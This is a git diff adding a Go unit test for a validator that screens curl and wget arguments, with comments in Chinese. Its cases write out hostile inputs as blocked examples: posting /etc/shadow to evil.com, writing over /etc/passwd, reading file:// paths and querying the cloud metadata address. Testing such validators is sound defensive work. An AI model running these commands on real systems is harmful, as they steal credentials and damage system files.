@@ -196,6 +196,60 @@ func TestParseArgs(t *testing.T) {
 	}
 }
 
+func TestValidateSafeArgs(t *testing.T) {
+	// 1. curl 正常参数
+	args, err := validateSafeArgs("curl", []string{"-I", "https://example.com"})
+	if err != nil || len(args) != 2 {
+		t.Fatalf("正常 curl 参数被拦截: %v", err)
+	}
+
+	// 2. 拦截 curl 本地写文件
+	_, err = validateSafeArgs("curl", []string{"-o", "/etc/passwd", "https://example.com"})
+	if err == nil {
+		t.Fatal("未能拦截 curl -o")
+	}
+
+	// 3. 拦截 @ 读取文件外发
+	_, err = validateSafeArgs("curl", []string{"-d", "@/etc/shadow", "https://evil.com"})
+	if err == nil {
+		t.Fatal("未能拦截 curl -d @")
+	}
+
+	// 4. 拦截 file:// 协议
+	_, err = validateSafeArgs("curl", []string{"file:///etc/passwd"})
+	if err == nil {
+		t.Fatal("未能拦截 file://")
+	}
+
+	// 5. 拦截云元数据 IP
+	_, err = validateSafeArgs("curl", []string{"http://169.254.169.254/latest/meta-data/"})
+	if err == nil {
+		t.Fatal("未能拦截云元数据 IP")
+	}
+
+	// 6. 拦截 wget 递归爬虫
+	_, err = validateSafeArgs("wget", []string{"-r", "https://example.com"})
+	if err == nil {
+		t.Fatal("未能拦截 wget -r")
+	}
+
+	// 7. wget 默认自动追加 -O - (防止落盘)
+	wArgs, err := validateSafeArgs("wget", []string{"-q", "https://example.com"})
+	if err != nil {
+		t.Fatalf("正常 wget 参数被拦截: %v", err)
+	}
+	foundStdout := false
+	for i := 0; i < len(wArgs)-1; i++ {
+		if wArgs[i] == "-O" && wArgs[i+1] == "-" {
+			foundStdout = true
+			break
+		}
+	}
+	if !foundStdout {
+		t.Fatal("wget 未能自动补齐 -O - 强制标准输出")
+	}
+}
+
 func TestFindDownloadedFile(t *testing.T) {
 	tmpDir, err := os.MkdirTemp("", "test_download_*")
 	if err != nil {
